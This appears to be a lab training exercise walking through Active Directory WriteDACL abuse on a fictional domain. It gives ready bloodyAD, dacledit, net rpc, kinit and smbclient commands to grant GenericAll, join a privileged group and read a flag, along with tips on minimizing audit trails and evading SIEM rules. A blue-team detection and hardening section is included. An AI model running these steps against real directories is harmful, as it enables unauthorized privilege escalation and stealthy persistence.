    Exercise 4.2: WriteDACL on a Group

    Before You Begin

    WriteDACL is the right to modify an object's access control list. The attacker exercises it by adding an ACE that grants them further rights (typically GenericAll), then exercising those further rights. On a group, the practical exploitation is: add an ACE granting yourself the right to write the member attribute, then add yourself to the group. Now you inherit whatever the group grants.

    Exercise 4.2 targets a per-token Backup_Operators_<token> group on which IT_HelpDesk has WriteDACL. Add yourself; read the per-token flag file accessible only to group members.

    Tools required: bloodyAD, net rpc, smbclient, bloodhound-python. Pre-installed on Kali.

    Scenario

    Marcus Bell: "GenericAll is the loud version. WriteDACL is the surgical version. You write your own ACE and clean up after. IT_HelpDesk has WriteDACL on a token-scoped Backup_Operators group. Add yourself, read the protected file, then remove your ACE before you leave so the audit trail is minimal."

    Credentials:

    Username Password
    j.chen Welcome2026#

    Domain: corp.nordport.local

    Your Objectives

    • Confirm IT_HelpDesk -WriteDACL-> Backup_Operators_<token> in BloodHound
    • Add a GenericAll ACE for j.chen on the group
    • Add j.chen to the group
    • Read \\corp-dc01\BackupFlags\<token>\FLAG.txt
    • Remove your ACE (operational hygiene; not scored, but the right habit)

    TGT/PAC Refresh Sequence

    Group rights live in the PAC of your TGT. Adding yourself does nothing until you obtain a fresh ticket. The diagram below traces what changes when.

    sequenceDiagram
    autonumber
    participant C as Attacker (j.chen)
    participant K as KDC
    participant FS as Server (BackupFlags share)

    C->>K: AS-REQ (initial kinit)
    K-->>C: TGT with PAC = {IT_HelpDesk}
    C->>K: WriteDACL: add GenericAll ACE
    C->>K: AddMember: add j.chen to Backup_Operators_<token>
    C->>FS: SMB connect with old TGT
    FS-->>C: ACCESS_DENIED (PAC missing new group)
    C->>K: kdestroy + kinit (fresh AS-REQ)
    K-->>C: NEW TGT with PAC = {IT_HelpDesk, Backup_Operators_<token>}
    C->>FS: SMB connect with new TGT
    FS-->>C: read FLAG.txt OK

    Background: WriteDACL vs WriteOwner

    Both WriteDACL and WriteOwner let you escalate rights on the target. The difference:

    Right Mechanism Cleanup difficulty
    WriteDACL Add an ACE to the existing ACL Easy: remove the added ACE
    WriteOwner Take ownership, then write the ACL Medium: restore the original owner

    WriteDACL is preferred when both are available because the ownership change is a high-fidelity audit trail (event 4670, "permissions on an object were changed", with the original owner field changing). A surgical ACE addition is also event 4670, but the "object owner" field is unchanged so a sloppy SOC may not notice.

    What ACE to add

    You want GenericAll on the group. Reasoning: - GenericAll includes write-property (so you can write the member attribute) - GenericAll includes the right to read all attributes (handy if you need to enumerate group state) - GenericAll is one ACE, simpler to clean up than three more-specific ones

    Alternative: add only WriteProperty on the member attribute (more surgical):

    bloodyAD ... add ace Backup_Operators_<token> j.chen --right WriteProperty --object-type member

    For class purposes, GenericAll is fine.

    Microsoft's behavior on group memberships

    When you write the member attribute on a group, the changes propagate immediately to the local DC and replicate to peer DCs at the next replication cycle (typically 15 minutes intra-site, 180 minutes inter-site). Your effective permissions update instantly on the local DC; you may need to wait for replication if you are authenticating against a different DC. In Nordport's single-DC setup this is not a concern.

    Tool Primer

    bloodyAD ACE manipulation

    Add a GenericAll ACE for j.chen on the group:

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add genericAll "Backup_Operators_<token>" j.chen

    Remove that ACE later (cleanup):

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  remove genericAll "Backup_Operators_<token>" j.chen

    dacledit.py (impacket)

    Linux equivalent for ACL writes:

    dacledit.py -action write -rights FullControl \
  -principal j.chen \
  -target-dn "CN=Backup_Operators_<token>,OU=IT,DC=corp,DC=nordport,DC=local" \
  -dc-ip corp-dc01 corp.nordport.local/j.chen:'Welcome2026#'

    Group membership writes via net rpc

    net rpc group addmem "Backup_Operators_<token>" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

net rpc group delmem "Backup_Operators_<token>" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

    Confirm via BloodHound

    Canonical BHCE form (paste as one line; substitute your uppercase token):

    MATCH (g:Group)-[:WriteDACL]->(t:Group) WHERE g.name = 'IT_HELPDESK@CORP.NORDPORT.LOCAL' AND t.name CONTAINS '<TOKEN>' RETURN t

    Walkthrough

    Step 1: Confirm the WriteDACL Edge

    Always confirm before exercising. WriteDACL is a quiet permission that is easy to miss when the graph is busy. In BloodHound CE search for IT_HelpDesk, then click "Outbound Object Control" in the left panel. The "WriteDACL" row lists every object IT_HelpDesk can rewrite the ACL for. The per-token Backup_Operators_<token> group should be there.

    Cypher equivalent (paste as one line; substitute your uppercase token like J001):

    MATCH (g:Group)-[:WriteDACL]->(t:Group) WHERE g.name = 'IT_HELPDESK@CORP.NORDPORT.LOCAL' AND t.name CONTAINS '<UPPER_TOKEN>' RETURN t

    Step 2: Add a GenericAll ACE for j.chen

    bloodyAD add genericAll <object> <principal> writes one new ACE into the object's DACL. The DC checks j.chen's effective rights on the target; the WriteDACL ACE inherited from IT_HelpDesk membership permits the modification. The new ACE grants j.chen full control over the object going forward.

    Kali - Grant yourself GenericAll on the group via bloodyAD

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add genericAll "Backup_Operators_${OCR_SCOPE_TOKEN}" j.chen
    Token Effect
    add genericAll <obj> <principal> Append a GENERIC_ALL ACE for <principal> to <obj>'s DACL.
    --host <dc> Target DC. bloodyAD speaks LDAP/RPC to this server.
    <obj> Target object name (sAMAccountName for users/groups, CN for computers).

    Verify the ACE landed:

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  get object "Backup_Operators_${OCR_SCOPE_TOKEN}" --attr nTSecurityDescriptor

    A new ACE for j.chen granting GENERIC_ALL should appear in the SDDL output.

    Step 3: Add j.chen to the Group

    With GenericAll in place you can write the member attribute. net rpc group addmem is the SAMR way; bloodyAD's add groupMember is the LDAP way. Both produce the same domain state.

    Kali - net rpc group addmem

    net rpc group addmem "Backup_Operators_${OCR_SCOPE_TOKEN}" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01
    Token Effect
    group addmem Subcommand: add member to group.
    "<group>" First positional.
    "<user>" Second positional.
    -U "DOM\u%pw" Authenticate as this principal.
    -S <dc> Target server.

    Or via bloodyAD (idempotent; safe to re-run):

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  add groupMember "Backup_Operators_${OCR_SCOPE_TOKEN}" j.chen

    Step 4: Get a Fresh Kerberos Ticket

    Group memberships are baked into the PAC inside your TGT at the moment of issuance. The TGT you already hold lists your previous groups; the KDC will not silently rewrite it. To exercise the new membership you must request a new TGT, which means a fresh AS-REQ.

    Kali - Re-authenticate to refresh group membership

    kdestroy
echo 'Welcome2026#' | kinit j.chen@CORP.NORDPORT.LOCAL
    Token Effect
    kdestroy Delete the existing credential cache.
    kinit <user>@<REALM> Request a new TGT. The realm must be uppercase.
    echo '<pw>' \| Pipe the password to skip the interactive prompt.

    Alternatively, the next SMB connection initiated by netexec or smbclient triggers a fresh authentication and receives a PAC with the new group automatically.

    Step 5: Read the Per-Token Flag

    The flag file lives in \\corp-dc01\BackupFlags\<token>\FLAG.txt. The DACL on that directory grants Backup_Operators_<token> the read right; with your fresh PAC, j.chen now inherits that right.

    Kali - Pull FLAG.txt from your token directory

    smbclient //corp-dc01/BackupFlags \
  -U "CORP\j.chen%Welcome2026#" \
  -c "cd ${OCR_SCOPE_TOKEN}; get FLAG.txt"
cat FLAG.txt

    Submit the OCR{...} value.

    Step 6: Cleanup (Operational Hygiene)

    Order matters. Remove yourself from the group first; you still have GenericAll via the ACE, which lets you make that change. Then remove the ACE. If you do these in reverse you remove the ACE before removing the membership, and you no longer have the right to clean up your own membership.

    Kali - Remove your ACE and group membership in correct order

    net rpc group delmem "Backup_Operators_${OCR_SCOPE_TOKEN}" "j.chen" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  remove genericAll "Backup_Operators_${OCR_SCOPE_TOKEN}" j.chen

    The cleanup is not scored. The habit is the point.

    Common gotchas

    • Cleanup order: removing the ACE before removing the membership leaves you stuck (no rights to remove yourself). Always remove membership first.
    • PAC stale: if smbclient returns NT_STATUS_ACCESS_DENIED after step 3, you skipped step 4. The fresh ticket is required.
    • Group nesting: in some configurations Backup_Operators_ is a member of Backup_Operators (the built-in). Your membership in the per-token group inherits transitively, but only after the ticket refresh.
    • bloodyAD permission cache: bloodyAD opens an LDAP bind once and reuses it. Run as a single command; running multiple bloodyAD invocations in quick succession works because each makes its own bind, but the per-bind permissions are evaluated fresh on the server.

    Blue Team Perspective

    The relevant signals fire on every WriteDACL chain; the noise around them is what makes detection hard. Defenders that diff DACLs against a baseline catch this attack reliably.

    Activity Event ID Where it fires
    DACL change on object 4670, 5136 DC Security log
    Group membership added 4728 / 4732 / 4756 DC Security log
    Auth as new group member 4624 logon type 3 Target server log
    MDI privileged-group change "Suspicious modification of a sensitive group" Defender for Identity

    Where the SOC catches WriteDACL

    Event 4670 fires thousands of times per day in normal operation, so raw volume is unusable. The detection that works is DACL diffing: take a snapshot of the SDDL on every Tier-0 and operator group weekly; alert on any new ACE granting GenericAll, WriteDACL, WriteOwner, or GenericWrite to a non-Tier-0 principal. Group-membership change events 4728/4732/4756 are also high-signal when paired with allow-listing of approved enrollers.

    Hardening Note

    WriteDACL is the most insidious AD finding because the ACE itself is the persistence. Cleanup discipline is the difference between an audit finding and an actual compromise.

    WriteDACL hardening

    • Build DACL baselines for every Tier-0 group and user in a Tier-0 OU; diff weekly.
    • Restrict WriteDACL and WriteOwner to the smallest possible set of trusted principals.
    • Audit and remove orphaned ACEs from prior projects (see Q3 dsacls.exe workflow).
    • Build a SIEM detection on group-membership change events (4728/4732/4756) with allow-list of legitimate enrollers.
    • Forward DACL changes (event 5136) on Tier-0 objects to the SIEM with retention long enough to detect slow-burn persistence (90+ days).

    Analysis Questions

    1. Microsoft logs DACL changes as event 4670. From a SOC perspective, why is monitoring 4670 cleanly so hard, and what makes WriteDACL exploitation often invisible?

    Reveal Answer

    Event 4670 fires whenever any object's DACL changes. AD writes thousands of these per day in normal operation: GPO updates, OU delegations adjusted by automation, scripts that adjust permissions during user provisioning, third-party tools rewriting ACLs after schema extensions. The signal-to-noise ratio is brutal. Most SOCs either turn 4670 logging off or filter it so heavily that only object-class changes (computer/user added or deleted) survive. WriteDACL exploitation produces a single 4670 against the target object with the new ACE in the SDDL string field; without parsing the SDDL and diffing against a known-good baseline, the SOC cannot tell that the new ACE grants attacker-controlled escalation. Defenders who do this well use change-monitoring products that diff DACLs against baselines and alert on new ACEs granting GenericAll, WriteDACL, WriteOwner, or GenericWrite to non-privileged principals.

    2. The exercise tells you to clean up your ACE before submitting. In a real engagement, when do you NOT clean up, and why?

    Reveal Answer

    You do not clean up when (a) the engagement explicitly asks you to leave persistence so the defender can practice detection and response, (b) you are still mid-engagement and may need to re-exercise the path, or (c) the customer wants the exact attacker-state preserved for forensic investigation later. Outside those cases, always clean up: every artifact you leave behind is something the customer has to chase down during their post-engagement validation, and a sloppy red team that leaves dozens of GenericAll ACEs across the directory looks unprofessional. Modern engagement reports include a "cleanup performed" section that lists exactly which artifacts were created and which were removed. The discipline is also useful in real attacks: a long-term operator who leaves new ACEs scattered in the directory increases their detectable surface every day.

    3. The attack chain is WriteDACL -> add GenericAll ACE -> add member -> profit. Why might a more careful operator add a more specific ACE than GenericAll?

    Reveal Answer

    More specific ACEs (e.g., WriteProperty on the member attribute only) are quieter in three senses: (a) some SIEM rules trigger on GenericAll granted to non-Tier-0 principals but ignore property-specific writes; (b) attribute-specific ACEs read more like a normal delegated permission ("the helpdesk can manage group memberships") than a clear escalation; (c) audit reports that highlight the worst-rights-granted often miss attribute-specific ACEs because their audit logic focuses on FullControl. The trade-off is that property-specific ACEs require knowing the right attribute GUID. For groups that is member (bf9679c0-0de6-11d0-a285-00aa003049e2). For full operational discipline, learn the GUIDs for the common attributes you write often: member for groups, pwdLastSet and userAccountControl for users, msDS-AllowedToActOnBehalfOfOtherIdentity for computers (RBCD).

    Key Takeaways

    • WriteDACL lets you add an ACE granting any further right; GenericAll on a group is the standard pick.
    • Group membership changes are immediate locally but require a new TGT to land in your PAC.
    • Cleanup is a habit: remove your ACE and your group membership at the end.
    • Event 4670 logs the change but signal-to-noise is poor; defenders need DACL baselines.
    • Property-specific ACEs are quieter than GenericAll; learn the common attribute GUIDs.

    Cheat Sheet Recap

    The four operations below cover WriteDACL exploitation and clean cleanup. Run them in this order; reverse the cleanup order is critical.

    Goal Command
    Add GenericAll ACE to group bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> add genericAll "<group>" <atk>
    Add yourself to the group net rpc group addmem "<group>" "<atk>" -U "<DOMAIN>\<atk>%<pw>" -S <dc>
    Refresh PAC kdestroy; echo '<pw>' \| kinit <atk>@<REALM>
    Cleanup (in this order) net rpc group delmem "<group>" "<atk>" ...; bloodyAD ... remove genericAll "<group>" <atk>

    Spaced Repetition

    Card 1: bloodyAD GenericAll ACE Add

    Q: Write the bloodyAD command to add a GenericAll ACE for j.smith on group Targets in corp.local, authenticating as j.smith / Pass#.

    Answer 
    bloodyAD -d corp.local -u j.smith -p 'Pass#' --host dc01 \
  add genericAll "Targets" j.smith

    Reverse with remove genericAll "Targets" j.smith. The verb add/remove toggles ACE presence; targets are object names; principal is the user being granted.

    Card 2: net rpc Group Membership

    Q: Add and then remove user j.smith from group Targets using j.smith / Pass# against DC dc01.

    Answer 
    net rpc group addmem "Targets" "j.smith" -U "DOM\j.smith%Pass#" -S dc01
net rpc group delmem "Targets" "j.smith" -U "DOM\j.smith%Pass#" -S dc01

    The user authenticating must have permission on the group (typically GenericAll, GenericWrite, or AddMember on the member attribute).

    Card 3: PAC Refresh

    Q: You added yourself to a group. Why might you still not see the new permission until you re-authenticate?

    Answer

    Group memberships are baked into the PAC inside your TGT at the time the TGT was issued. Subsequent TGS-REPs derived from that TGT inherit the same PAC. Your new membership only appears in tickets issued after a fresh AS exchange. To force the refresh: kdestroy then kinit user@REALM. SMB clients usually re-authenticate transparently on the next connection, but if you have a long-lived ticket cache (browser SSO, mounted shares), the new permission may not appear until you log out and back in.

    Card 4: Specific Attribute GUIDs

    Q: Name the attribute GUID for the member attribute on a group object.

    Answer

    bf9679c0-0de6-11d0-a285-00aa003049e2. Used in attribute-specific ACEs. Other common ones to memorize: f3a64788-5306-11d1-a9c5-0000f80367c1 (servicePrincipalName), bf967a0a-0de6-11d0-a285-00aa003049e2 (pwdLastSet), 3f78c3e5-f79a-46bd-a0b8-9d18116ddc79 (msDS-AllowedToActOnBehalfOfOtherIdentity, the RBCD attribute).

    Card 5: Cleanup Order

    Q: You exercised WriteDACL: added a GenericAll ACE, joined the group. List the cleanup steps in correct order.

    Answer
    1. Remove yourself from the group: net rpc group delmem "Group" "you". 2. Remove the ACE you added: bloodyAD remove genericAll "Group" you. Order matters: removing the ACE first kills your right to remove yourself from the group, leaving you stuck. If you forget step 1 and remove the ACE first, you can recover by re-exercising your WriteDACL right (if it still exists) or by getting a Domain Admin to clean up.
